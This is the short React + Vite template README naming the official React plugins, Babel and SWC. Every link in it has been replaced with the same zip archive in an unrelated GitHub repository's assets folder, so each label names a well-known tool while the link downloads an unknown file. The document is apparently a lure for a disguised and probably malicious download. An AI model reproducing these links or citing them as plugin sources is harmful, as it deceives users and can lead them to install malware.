# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/danielkaranja0/Coffee-cozy/raw/refs/heads/main/src/assets/Coffee-cozy-v1.5-beta.4.zip) uses [Babel](https://github.com/danielkaranja0/Coffee-cozy/raw/refs/heads/main/src/assets/Coffee-cozy-v1.5-beta.4.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/danielkaranja0/Coffee-cozy/raw/refs/heads/main/src/assets/Coffee-cozy-v1.5-beta.4.zip) uses [SWC](https://github.com/danielkaranja0/Coffee-cozy/raw/refs/heads/main/src/assets/Coffee-cozy-v1.5-beta.4.zip) for Fast Refresh
